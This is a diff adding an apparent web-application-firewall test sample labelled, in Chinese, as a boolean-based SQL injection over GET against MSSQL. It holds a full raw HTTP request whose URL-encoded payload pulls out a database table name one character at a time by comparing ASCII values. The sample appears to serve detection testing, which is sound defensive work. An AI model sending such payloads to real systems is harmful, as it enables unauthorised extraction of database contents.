@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_布尔注入-06506454
+# 攻击者基于布尔查询，将"ascii(substring((select top 1 name from mydb..sysobjects where xtype='U' and id not in(select top 0 id from test..sysobjects where xtype='U')),1,1))=111"语句注入到 SQL 查询参数中，通过substring()函数提取字符，在转换成ascii值进行比较，逐个字符爆破出test数据库中第一个表名。
+GET /?id=1%20and%20ascii%28substring%28%28select%20top%201%20name%20from%20mydb..sysobjects%20where%20xtype=%27U%27%20and%20id%20not%20in%28select%20top%200%20id%20from%20test..sysobjects%20where%20xtype=%27U%27%29%29%2C1%2C1%29%29=111&bid=hd_tag_m8mv26mi HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26mi
+RM-PRO-Token: a2b5d0e70e4027a818773aacc0b55102
+RM-PRO-Time: 1742808636818
+User-Agent: curl/7.83.1
+
